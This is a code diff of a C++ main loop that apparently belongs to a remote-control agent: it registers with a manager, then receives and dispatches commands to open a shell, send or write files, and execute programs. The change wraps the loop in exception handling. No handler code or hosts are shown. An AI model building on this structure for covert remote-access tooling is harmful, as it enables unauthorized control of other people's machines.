@@ -43,53 +43,62 @@ main()
     
     manager.makeRegister();
 
-    while (1){
-        vector <string> cmd = manager.getComand();
-        options option=cmd2Enum(cmd[0]);
-        cmd.erase(cmd.begin());
-        //colocar cmd como comando a receber
-
-        switch (option)
+    while (1)
+    {
+        try 
         {
-        case op_openShell:
-            cout << "opening shell" << endl;
-            openShell(cmd,manager);
-            break;
+            vector <string> cmd = manager.getComand();
+            options option=cmd2Enum(cmd[0]);
+            cmd.erase(cmd.begin());
+            //colocar cmd como comando a receber
 
-        case op_sendfile:
-            cout << "op_sendfile" << endl;
-            sendfile(cmd,manager);
-            break;
-        
-        case op_writefile:
-            cout << "op_writefile" << endl;
-            writefile(cmd,manager);
-            break;
-        
-        case op_execute:
-            cout << "op_execute" << endl;
-            execute(cmd,manager);
-            break;
+            switch (option)
+            {
+                case op_openShell:
+                    cout << "opening shell" << endl;
+                    openShell(cmd,manager);
+                    break;
 
-        case op_run:
-            cout << "op_run" << endl;
-            run(cmd,manager);
-            break;
+                case op_sendfile:
+                    cout << "op_sendfile" << endl;
+                    sendfile(cmd,manager);
+                    break;
         
-        case op_isOK:
-            cout << "op_isOK" << endl;
-            isOK(manager);
-            break;
+                case op_writefile:
+                    cout << "op_writefile" << endl;
+                    writefile(cmd,manager);
+                    break;
+        
+                case op_execute:
+                    cout << "op_execute" << endl;
+                    execute(cmd,manager);
+                    break;
 
-        case op_nop:
-            cout << "NOP" << endl;
-            break;
+                case op_run:
+                    cout << "op_run" << endl;
+                    run(cmd,manager);
+                    break;
+        
+                case op_isOK:
+                    cout << "op_isOK" << endl;
+                    isOK(manager);
+                    break;
+
+                case op_nop:
+                    cout << "NOP" << endl;
+                    break;
         
         
-        default:
-            cout << "unkownOption" << endl;
-            break;
+                default:
+                    cout << "unkownOption" << endl;
+                    break;
+            }
+
         }
+        catch(...)
+        {
+            return 1;
 
+        }
     }
 }
